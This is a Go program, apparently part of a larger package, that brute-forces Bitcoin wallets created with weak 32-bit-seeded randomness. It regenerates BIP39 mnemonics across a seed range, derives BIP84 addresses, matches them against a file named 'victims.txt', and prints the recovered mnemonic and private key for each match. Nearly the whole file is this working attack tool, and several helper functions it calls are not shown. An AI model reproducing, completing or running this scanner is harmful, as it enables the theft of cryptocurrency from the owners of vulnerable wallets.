package main

import (
	"bufio"
	"crypto/sha512"
	"flag"
	"fmt"
	"os"
	"runtime"
	"strings"
	"sync/atomic"
	"time"

	"golang.org/x/crypto/pbkdf2"
)

var targets map[string]struct{}

func loadLines(p string) []string {
	f, err := os.Open(p)
	if err != nil {
		panic(err)
	}
	defer f.Close()
	var out []string
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		s := strings.TrimSpace(sc.Text())
		if s != "" {
			out = append(out, s)
		}
	}
	return out
}

func main() {
	var (
		padStart = flag.Uint64("pad-start", 0, "pad range start")
		padEnd   = flag.Uint64("pad-end", 1<<32, "pad range end")
		skipMax  = flag.Int("skip-max", 64, "max skip")
		idxMax   = flag.Int("idx-max", 8, "address indices per account")
		wordF    = flag.String("words", "bip39_english.txt", "wordlist")
		victF    = flag.String("victims", "victims.txt", "target addresses")
		selftest = flag.Bool("selftest", false, "verify pipeline against a known vector then exit")
	)
	flag.Parse()

	words = loadLines(*wordF)
	targets = map[string]struct{}{}
	for _, a := range loadLines(*victF) {
		targets[a] = struct{}{}
	}

	if *selftest {
		// BIP84 official vector: abandon x23 + about -> bc1qcr8te4kr609gcawutmrza0j4xv80jy8z306fyu
		mn := "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about"
		seed := pbkdf2.Key([]byte(mn), []byte("mnemonic"), 2048, 64, sha512.New)
		mk := masterKey(seed)
		acct := ckdPriv(ckdPriv(ckdPriv(mk, 84|H), 0|H), 0|H)
		leaf := ckdPriv(ckdPriv(acct, 0), 0)
		got := addrFromPriv(leaf.key)
		want := "bc1qcr8te4kr609gcawutmrza0j4xv80jy8z306fyu"
		status := "FAIL"
		if got == want {
			status = "OK"
		}
		fmt.Println("BIP84 vector:", got, status)
		return
	}

	fmt.Printf("[scanner] targets=%d pad=[%d,%d) skip=[0,%d) idx=[0,%d) cores=%d\n",
		len(targets), *padStart, *padEnd, *skipMax, *idxMax, runtime.NumCPU())

	var count uint64
	start := time.Now()
	done := make(chan struct{})
	go func() {
		t := time.NewTicker(10 * time.Second)
		defer t.Stop()
		for {
			select {
			case <-done:
				return
			case <-t.C:
				c := atomic.LoadUint64(&count)
				fmt.Printf("[scan] %d cand  %.0f cand/s  elapsed %.0fs\n",
					c, float64(c)/time.Since(start).Seconds(), time.Since(start).Seconds())
			}
		}
	}()

	ncpu := runtime.NumCPU()
	span := (*padEnd - *padStart) / uint64(ncpu)
	fin := make(chan struct{}, ncpu)
	for w := 0; w < ncpu; w++ {
		lo := *padStart + uint64(w)*span
		hi := lo + span
		if w == ncpu-1 {
			hi = *padEnd
		}
		go func(lo, hi uint64) {
			defer func() { fin <- struct{}{} }()
			for pad := lo; pad < hi; pad++ {
				for skip := 0; skip < *skipMax; skip++ {
					ent, ok := seedEntropy(uint32(pad), skip)
					if !ok {
						continue
					}
					mn := entropyToMnemonic(ent)
					seed := pbkdf2.Key([]byte(mn), []byte("mnemonic"), 2048, 64, sha512.New)
					acct := ckdPriv(ckdPriv(ckdPriv(masterKey(seed), 84|H), 0|H), 0|H)
					ext := ckdPriv(acct, 0)
					for idx := uint32(0); idx < uint32(*idxMax); idx++ {
						leaf := ckdPriv(ext, idx)
						addr := addrFromPriv(leaf.key)
						if _, hit := targets[addr]; hit {
							fmt.Printf("\n[HIT] addr=%s pad=%d skip=%d idx=%d\n  mnemonic=%s\n  priv=%x\n\n",
								addr, pad, skip, idx, mn, leaf.key)
						}
					}
					atomic.AddUint64(&count, 1)
				}
			}
		}(lo, hi)
	}
	for i := 0; i < ncpu; i++ {
		<-fin
	}
	close(done)
	fmt.Println("[scan] sweep complete")
}
